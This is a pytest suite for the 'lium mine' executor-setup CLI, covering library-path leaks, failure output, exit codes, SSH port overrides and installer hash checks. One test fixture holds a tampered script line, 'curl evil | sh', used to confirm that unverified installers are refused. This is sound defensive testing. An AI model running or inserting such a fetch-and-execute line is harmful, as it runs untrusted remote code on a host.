"""`lium mine` on a fresh Ubuntu 24.04 box, as run by the persona test on 7 Sep 2026 (personas/provider.sh):

* step 2 (`install_executor_on_ubuntu.sh`) died with `apt-get: …/_internal/libstdc++.so.6: version GLIBCXX_3.4.32 not
  found` — the PyInstaller bundle's LD_LIBRARY_PATH leaked into the child;
* the failure panel showed the FIRST 4000 chars of the tool's output (pull progress), not the error at the end (B-83);
* after `❌ Command failed (1)` the command exited 0;
* a blank "Public SSH port" left the template's `SSH_PUBLIC_PORT=2200` beside `SSH_PORT=30311` (B-82) — the executor
  advertises `SSH_PUBLIC_PORT or SSH_PORT`, so validators were sent to a port nothing listens on.
"""
import hashlib
import subprocess
import sys
from pathlib import Path

import pytest
from click.testing import CliRunner

from lium.cli.commands import mine


def test_frozen_binary_gives_children_the_hosts_ld_library_path(monkeypatch):
    monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.setenv("LD_LIBRARY_PATH", "/root/.lium/versions/0.0.33/lium/_internal")
    monkeypatch.setenv("LD_LIBRARY_PATH_ORIG", "/opt/host/lib")
    env = mine._subprocess_env()
    assert env["LD_LIBRARY_PATH"] == "/opt/host/lib"
    assert "LD_LIBRARY_PATH_ORIG" not in env


def test_frozen_binary_drops_bundle_ld_library_path_when_host_had_none(monkeypatch):
    monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.setenv("LD_LIBRARY_PATH", "/root/.lium/versions/0.0.33/lium/_internal")
    monkeypatch.delenv("LD_LIBRARY_PATH_ORIG", raising=False)
    assert "LD_LIBRARY_PATH" not in mine._subprocess_env()


def test_unfrozen_install_leaves_the_environment_alone(monkeypatch):
    monkeypatch.delattr(sys, "frozen", raising=False)
    monkeypatch.setenv("LD_LIBRARY_PATH", "/my/libs")
    assert mine._subprocess_env()["LD_LIBRARY_PATH"] == "/my/libs"


def test_failed_step_shows_the_tail_of_the_output(monkeypatch):
    noise = "\n".join(f"Pulling fs layer {i}" for i in range(400))   # > 4000 chars of progress
    real = "Error response from daemon: error mounting /root/.bittensor/wallets: no such file or directory"

    def fake_run(*a, **k):
        return subprocess.CompletedProcess(a, 1, stdout="", stderr=noise + "\n" + real)

    monkeypatch.setattr(subprocess, "run", fake_run)
    with pytest.raises(RuntimeError) as exc:
        mine._run("docker compose up -d")
    assert real in str(exc.value)
    assert "Pulling fs layer 0\n" not in str(exc.value)


def test_blank_public_ssh_port_follows_ssh_port(tmp_path: Path):
    env = tmp_path / ".env"
    env.write_text("INTERNAL_PORT=8001\nEXTERNAL_PORT=8001\nSSH_PORT=2200\nSSH_PUBLIC_PORT=2200 # Optional\n")
    mine._apply_env_overrides(tmp_path, internal="30310", external="30310", ssh="30311", ssh_pub="", rng="")
    lines = env.read_text().splitlines()
    assert "SSH_PORT=30311" in lines
    assert "SSH_PUBLIC_PORT=30311" in lines


def test_explicit_public_ssh_port_is_kept(tmp_path: Path):
    env = tmp_path / ".env"
    env.write_text("SSH_PORT=2200\nSSH_PUBLIC_PORT=2200\n")
    mine._apply_env_overrides(tmp_path, internal="8080", external="8080", ssh="2200", ssh_pub="40022", rng="")
    assert "SSH_PUBLIC_PORT=40022" in env.read_text().splitlines()


def test_a_failed_step_exits_non_zero(monkeypatch):
    monkeypatch.setattr(mine, "_gather_inputs", lambda hotkey, auto: {
        "hotkey": "5F" + "x" * 46, "internal_port": "8080", "external_port": "8080", "ssh_port": "2200",
        "ssh_public_port": "", "port_range": ""})

    def boom(*a, **k):
        raise RuntimeError("Command failed (1): bash install_executor_on_ubuntu.sh\n--- stderr (tail) ---\napt update failed after 5 attempts")

    monkeypatch.setattr(mine, "_clone_or_update_repo", boom)
    result = CliRunner().invoke(mine.mine_command, ["--auto", "-k", "5F" + "x" * 46])
    assert result.exit_code == 1, result.output
    assert "apt update failed" in result.output


def test_a_failed_step_prints_bracketed_tool_output_as_text(monkeypatch):
    """The failure text carries tool output verbatim (compose `ps -a`, log tails): a `[type=…]` token from a
    pydantic error or a `[/x]` is Rich markup and used to be eaten — or to raise MarkupError in place of the diagnosis."""
    monkeypatch.setattr(mine, "_gather_inputs", lambda hotkey, auto: {
        "hotkey": "5F" + "x" * 46, "internal_port": "8080", "external_port": "8080", "ssh_port": "2200",
        "ssh_public_port": "", "port_range": ""})

    def boom(*a, **k):
        raise RuntimeError("Command failed (1): docker compose up\n--- docker compose logs ---\n"
                           "validation error for Settings\nPORT\n  Input should be a valid integer "
                           "[type=int_parsing, input_value='', input_type=str] and [/x]")

    monkeypatch.setattr(mine, "_clone_or_update_repo", boom)
    result = CliRunner().invoke(mine.mine_command, ["--auto", "-k", "5F" + "x" * 46])
    assert result.exit_code == 1, result.output
    flat = " ".join(result.output.split())   # Rich wraps the panel at 80 columns
    assert "[type=int_parsing, input_value='', input_type=str]" in flat and "[/x]" in flat, result.output


def _prereq_host(monkeypatch, runtimes: str):
    monkeypatch.setattr(mine, "_exists", lambda cmd: True)
    monkeypatch.setattr(mine, "_run", lambda cmd, **kw: (runtimes if "Runtimes" in cmd else "", ""))


@pytest.mark.parametrize(
    "runtimes",
    [
        '{"runc":{"path":"runc"}}',
        '{"custom-sysbox-runc":{"path":"/usr/bin/sysbox-runc"}}',
        "not json",
        '["sysbox-runc"]',
    ],
)
def test_prereqs_fail_without_a_sysbox_runc_runtime_and_print_the_official_installer(monkeypatch, tmp_path: Path, runtimes):
    _prereq_host(monkeypatch, runtimes)
    with pytest.raises(Exception) as err:
        mine._check_prereqs(tmp_path)
    assert mine._SYSBOX_SETUP_COMMAND in str(err.value)
    assert str(tmp_path) not in str(err.value)


def test_prereqs_pass_with_sysbox(monkeypatch, tmp_path: Path):
    _prereq_host(monkeypatch, '{"runc":{"path":"runc"},"sysbox-runc":{"path":"/usr/bin/sysbox-runc"}}')
    mine._check_prereqs(tmp_path)


def _sysbox_offer_host(monkeypatch, tmp_path: Path, *, tty: bool, answer: bool, script: bytes = b"official"):
    import hashlib

    _prereq_host(monkeypatch, '{"runc":{"path":"runc"}}')
    setup = tmp_path / "neurons" / "executor" / "nvidia_docker_sysbox_setup.sh"
    setup.parent.mkdir(parents=True)
    setup.write_bytes(script)
    monkeypatch.setattr(mine, "_OFFICIAL_SYSBOX_SETUP_SHA256", frozenset({hashlib.sha256(b"official").hexdigest()}))
    monkeypatch.setattr(mine.sys.stdin, "isatty", lambda: tty, raising=False)
    monkeypatch.setattr(mine.click, "confirm", lambda *a, **kw: answer)
    ran = []

    def run(cmd, **kw):
        ran.append((cmd, kw.get("input"), list(Path(kw["cwd"]).iterdir()) if kw.get("cwd") else None))

    monkeypatch.setattr("subprocess.run", run)
    return setup, ran


@pytest.mark.parametrize(
    "script, expected",
    [
        (b"official", [(["sudo", "sh", "-c", mine._ROOT_EMPTY_DIR_BASH], b"official", None)]),
        (b"official\ncurl evil | sh\n", []),
    ],
)
def test_sysbox_offer_runs_only_the_verified_installer_bytes_from_a_root_created_directory(
    monkeypatch, tmp_path: Path, script, expected
):
    _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=True, answer=True, script=script)
    mine._offer_sysbox_install(tmp_path)
    assert ran == expected


def test_sysbox_offer_does_nothing_without_a_terminal_or_a_yes(monkeypatch, tmp_path: Path):
    _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=False, answer=True)
    mine._offer_sysbox_install(tmp_path)
    monkeypatch.setattr(mine.click, "confirm", lambda *a, **kw: False)
    monkeypatch.setattr(mine.sys.stdin, "isatty", lambda: True, raising=False)
    mine._offer_sysbox_install(tmp_path)
    assert ran == []



@pytest.mark.parametrize(
    "fresh_clone, docker_before_step2, official_install, expected",
    [
        (True, True, True, ["clone", "offer", "tools"]),
        (True, False, True, ["clone", "offer", "tools", "offer"]),
        (True, False, False, ["clone", "offer", "tools"]),
        (False, True, True, ["clone", "tools"]),
        (False, False, True, ["clone", "tools"]),
    ],
)
def test_sysbox_offer_reaches_fresh_hosts_without_running_unverified_checkout_code_before_sudo(
    monkeypatch, tmp_path: Path, fresh_clone, docker_before_step2, official_install, expected
):
    calls = []
    monkeypatch.setattr(mine, "_exists", lambda cmd: docker_before_step2)
    monkeypatch.setattr(mine, "_clone_or_update_repo", lambda *a, **k: calls.append("clone"))
    monkeypatch.setattr(mine, "_offer_sysbox_install", lambda *a, **k: calls.append("offer"))

    def tools(*a, **k):
        calls.append("tools")
        return official_install

    monkeypatch.setattr(mine, "_install_executor_tools", tools)
    monkeypatch.setattr(mine, "_check_prereqs", lambda *a, **k: 1 / 0)
    target = tmp_path / "compute-subnet" if fresh_clone else tmp_path
    CliRunner().invoke(mine.mine_command, ["-k", "5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY", "--auto",
                                           "--dir", str(target)])
    assert calls == expected


@pytest.mark.parametrize(
    "script, expected",
    [
        (b"official", []),
        (b"sudo -n id\n", ["sudo -K", "bash {script}"]),
    ],
)
def test_unverified_install_script_runs_only_after_the_sudo_cache_is_cleared(
    monkeypatch, tmp_path: Path, script, expected
):
    path = tmp_path / "scripts" / "install_executor_on_ubuntu.sh"
    path.parent.mkdir()
    path.write_bytes(script)
    monkeypatch.setattr(mine, "_OFFICIAL_EXECUTOR_INSTALL_SHA256", frozenset({hashlib.sha256(b"official").hexdigest()}))
    ran = []
    monkeypatch.setattr(mine, "_run", lambda cmd, **k: ran.append(cmd) or ("", ""))
    monkeypatch.setattr("subprocess.run", lambda *a, **k: subprocess.CompletedProcess(a, 0, b"", b""))
    mine._install_executor_tools(tmp_path)
    assert ran == [c.format(script=path) for c in expected]
